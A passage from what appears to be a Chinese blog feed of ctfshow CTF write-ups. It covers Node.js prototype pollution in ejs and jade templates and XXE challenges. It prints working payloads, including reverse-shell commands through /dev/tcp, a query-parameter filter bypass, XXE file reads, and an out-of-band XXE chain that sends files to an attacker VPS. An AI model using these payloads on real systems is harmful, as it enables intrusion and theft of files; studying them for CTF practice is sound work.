language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这就是为什么要污染两层的原因</p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话，render触发由<strong>api.js</strong>改到了<strong>index.js</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.111/11111 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>先去污染/login，然后再去抓index.js的包，触发render</p><p><img src="../images/image-20230201205016149.png" alt="image-20230201205016149"></p><h2 id="web342-jade模板渲染"><a href="#web342-jade模板渲染" class="headerlink" title="web342(jade模板渲染)"></a>web342(jade模板渲染)</h2><p>题目</p><p><img src="../images/image-20230201205558380.png" alt="image-20230201205558380"></p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123;<span class="attr">title</span>:<span class="string">&#x27;ctfshow&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题难度太大，看着wp都看不懂，直接拿payload打就行了</p><p><a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">别的师傅写的超详细wp</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>方法和ejs渲染一样</p><h2 id="web343-jade模板渲染-加了过滤"><a href="#web343-jade模板渲染-加了过滤" class="headerlink" title="web343(jade模板渲染  加了过滤)"></a>web343(jade模板渲染  加了过滤)</h2><p>题目</p><p><img src="../images/image-20230201211333400.png" alt="image-20230201211333400"></p><p>源码</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">match</span>(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>和上一题一样</p><h2 id="web344"><a href="#web344" class="headerlink" title="web344()"></a>web344()</h2><p>题目</p><p><img src="../images/image-20230201211803497.png" alt="image-20230201211803497"></p><p>题目给的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>正常就是这样：<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>，但是不行，发现把逗号给过滤了</p><p>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些</p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p><p>nodejs 会把同名参数以数组的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</p><p>这样传：<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;%22name%<span class="number">22</span>:%22admin%<span class="number">22</span>&amp;query=%22password%<span class="number">22</span>:%<span class="number">22</span>%63tfshow%<span class="number">22</span>&amp;query=%22isVIP%<span class="number">22</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>首先就是node.js处理req.query.query的时候，它不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析，因此这样分开来传就可以绕过逗号了。至于c那个之所以要再进行url编码成%63,就是因为前面的%22，会造成%22c，正好ban了2c，所以c也需要进行url编码。学到了学到了，很有意思的特性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;nodejs官方中文文档，不明白的东西可以进去查 &lt;a href=&quot;http://nodejs.cn/api&quot;&gt;文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章写的很好  —-&amp;gt;  &lt;a href=&quot;https://tari.moe/2021/05/04/ctfshow-node</summary>
      
    
    
    
    
    <category term="ctfshow nodejs 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-nodejs-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-xxe 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/93a17fc8.html"/>
    <id>https://ke1nys.github.io/posts/93a17fc8.html</id>
    <published>2023-01-23T09:39:52.000Z</published>
    <updated>2023-01-23T15:40:18.651Z</updated>
    
    <content type="html"><![CDATA[<p>xxe的解释  —-&gt;   <a href="https://xz.aliyun.com/t/3357#toc-24">这篇文章</a>   —-&gt;讲的比较详细了，几乎覆盖了xxe的所有攻击方法</p><p><a href="https://security.tencent.com/index.php/blog/msg/69">这篇文章写的也不错</a> —-&gt;  也是对xxe攻击的解释和介绍</p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>题目</p><p><img src="../images/image-20230123174724507.png" alt="image-20230123174724507"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// xml文件来源于数据流</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  <span class="comment">// 加载xml实体，参数为替代实体、加载外部子集</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  <span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">  <span class="comment">// 节点嵌套</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于php为协议  <code>php://input</code>的作用，试所以我们得进行post发包。</p><p>得用bp,hackbar不行</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">payload</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">payload</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码里的payload  xxe  creds 可以根据自己的情况进行修改，不会影响最终的结果</p><p><code>ctfshow</code>是不能进行修改的   因为题目的<code>echo $ctfshow</code>得需要<code>ctfshow</code></p><p>但是在<code>ENTITY</code>里的<code>xxe</code>必须得和外边的<code>&amp;xxe;</code>相等</p><p><img src="../images/image-20230123180043163.png" alt="image-20230123180043163"></p><p>写进去的时候必须得空一格，因为这个可能是个语法要求。</p><h2 id="web374-376-过滤了xml"><a href="#web374-376-过滤了xml" class="headerlink" title="web374-376(过滤了xml)"></a>web374-376(过滤了xml)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题相较上题而言，没有了回显   就是<code>echo</code>输出</p><p>所以我们就得进行外带了  得自己准备一个vps</p><p><strong>第一步</strong></p><p>先在自己的服务器上建一个网站，然后给一个端口号</p><p><img src="../images/image-20230123225626535.png" alt="image-20230123225626535"></p><p><strong>第二步</strong></p><p>就开始在网站的根目录下写所需要的文件</p><p>先写一个<strong>pd.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vsp:端口号/xxe.php?q=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后写个xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在写一个flag.txt用来存反弹回来的flag</p><p><img src="../images/image-20230123230041340.png" alt="image-20230123230041340"></p><p>就是可以先拿自己的vps去看一下能不能访问这三个文件，如果能访问的话就进行post发包。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps:端口号/pd.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230123230256902.png" alt="image-20230123230256902"></p><p>如果成功的话，就会在自己的网站根目录看到flag.</p><p><img src="../images/image-20230123230333502.png" alt="image-20230123230333502"></p><p>上面的方法是通杀方法  —-&gt;   题目把xml给过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span 